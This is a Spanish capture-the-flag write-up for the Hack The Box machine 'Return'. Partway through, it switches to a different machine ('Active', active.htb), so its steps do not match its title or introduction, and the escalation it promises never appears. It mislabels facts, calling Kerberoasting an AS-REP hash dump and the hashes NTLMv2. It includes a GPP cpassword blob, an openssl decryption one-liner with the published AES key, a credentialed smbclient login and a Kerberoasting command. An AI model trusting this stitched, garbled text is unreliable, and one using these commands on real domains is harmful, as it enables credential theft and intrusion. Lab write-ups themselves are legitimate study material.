---
title: "Return HTB WriteUp"
layout: post
---
![Return HTB](/assets/images/Return 1.png)


<h2>Presentación</h2>
Return forma parte del Hack The Box printer track, junto a máquinas como Driver y Antique. La primera parte de la instrucción es muy sencilla es simplemente redirigir la ip o el (_FQDN_), que se encuentra apuntando a un url interno en el panel web y obtener credenciales de LDAP mientras te mantienes en escuchas por el puerto 389, luego en la fase de reconocimiento para  escalar privilegios vemos posibilidades de hacerlo abusando de SetBackupPrivilige or SetLoadDriverPrivilege, pero eso lo traeremos más adelante, en esta ocasión escalaremos privilegios a través del Server Operator Group, que es un privilegio con lo que cuenta el usuario, del cual obtuvimos credenciales en primer lugar.

<h2>Reconocimiento</h2>

En la fase de reconocimiento realizamos el siguiente network map, exportando el output en formato grep a un archivo llamado allports:
  
{% highlight bash %}
nmap -p- --min-rate 5000 10.10.11.108 -oG allports
{% endhighlight %}

**Output** 
[*] IP Address: 10.10.11.108

{% highlight bash %}
[*] Open ports: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49697,59724
{% endhighlight %}

<h2>Puertos y Servicios</h2>
Por la cantidad de puertos y servicios involucrados luce comno un Domain Controller, puertos como 53, 88, DNS y Kerberos resepctivamente, servicos y puertos de RPC 135-139, 389 LDAP como mencionamos anteriormente. Ahora procederemos con ejecutar las opciones _sCV_ para reconocimiento básico de scripts para dichos puertos y servicios. 

{% highlight bash %}
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49697,59724 -sCV 10.10.11.108 -oN targeted
{% endhighlight %}

![Ative HTB](/assets/images/services.png)

<h2> Servicio SMB 445 </h2>
Utilizando cramapexec smb y smbclient en la fase de reconocimiento, para saber frente a que estamos:

{% highlight bash %}
SMB    10.10.11.108    445    PRINTER    [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
{% endhighlight %}

La máquina se llama Printer, al parecer un Windows 10.0, la cual pertene al dominio _return.local_, que añadiremos a nuestro _/etc/hosts_.

```
smbclient -L 10.10.11.108 -N                                        
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.108 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
```
smbmap -H 10.10.11.108 -u 'null'
[!] Authentication error on 10.10.11.108
```
<h2> Servicio DNS 53 </h2>
```
nslookup 
> server 10.10.11.108
Default server: 10.10.11.108
Address: 10.10.11.108#53
> 10.10.11.108
;; connection timed out; no servers could be reached
```
Tampoco funcionó el ataque de trasferencia de zona a dicho servicio.

<h2>Servicio HTTP puerto 80</h2>

En la session de settings dentro del panel web, encontramos:

![Return HTB](/assets/images/Return 80.png)

Que como mencione anteriormente es simplemente hacer que el url se dirija a nuestra direccion ip de atacante.

![Return HTB](/assets/images/Return 81.png)

Luego de navegar por el directorio policies en busca de algo interesante y observando cada archivo hasta dar con el archivo groups.xml, que según el siguiente article de [Hacking-Article][Hacking-Article] es creado como consecuencia de la configuración de Group Policy Preference, en la que permiten a un administrador crear policies e instalar aplicaciones a través de Group Policy. Y sobre la cual se guarda una contraseña encriptada en formato _cpassword_, y de la cual Microsoft publicó la llave, como podemos observar en el siguiente artículo, [Microsoft][Microsoft], trasladamos el contenido de dicha carpeta a nuestra carpeta content y efectivamente, como se puede observar, obtenemos las credenciales del usuario SVC_TGS:

{% highlight bash %} <?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups> {% endhighlight %}

Desencriptamos la contraseña con el uso de la herramienta gpp-decrypt:

![Ative HTB](/assets/images/ggp.png)

también podemos hacer uso de el siguiente one-liner ya que conocemos la llave como mencionamos anteriormente:
{% highlight bash %} 
echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000 
{% endhighlight %}

<h2>Validación de credenciales</h2>

Utilizamos la herramienta crackmapexec.py del poderoso _impacket_ para verificar la autenticidad de dicho usuario en el dominio **active.htb**, las cuales resultaron ser válida aunque no obtuvimos un (Pwned!) e intentamos verificar si podiamos loguearnos a traves de winrm, pero no fue así. 

![Ative HTB](/assets/images/gpp.png)

**Nota** desde aqui podemos visualizar la flag del user, haciendo uso de smbclient y navegando entre directorios :)

{% highlight bash %} smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingSt----8 {% endhighlight %}

Pero teniendo un usuario y contraseña, se nos hace posible realizar un Kerberoasting attack, el cual TCM Security explica detallamente, que nos _dumpea_ los krbasrep5 hashes de las cuentas que tienen _Kerberos pre-authentication deshabilidata_ pero que explico con más detalle en el siguiente artículo, sobre mis apuntes. 
Para esto utilizamos la herramienta _GetUserSPNs.py_, del poderoso impacket 🏅  

{% highlight bash %} GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS {% endhighlight %}

obtenemos el hash NTLMv2, enviamos a un archivo de texto y utilizamos John The Ripper, para obtener la credencial en texto plano.

![Ative HTB](/assets/images/hash.png)

y ya obteniendo credenciales de administrador como nos muestra la primera línea del output del GetUserSPNs.py, y contraseña nos logueamos en el sistema. 

![Ative HTB](/assets/images/psexec.png)

Ya siendo Nt Authority\System, a buscar las flags.
Que he decidido mostrar solo si existe algún paso más para llegar a ellas, no que tan solo sea navegar entre directorios como es este el caso, para poder verla. 

🖱️_by:_ *@DaVinciRoot*

[Hacking-Article]: https://www.hackingarticles.in/credential-dumping-group-policy-preferences-gpp/
[Microsoft]: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0
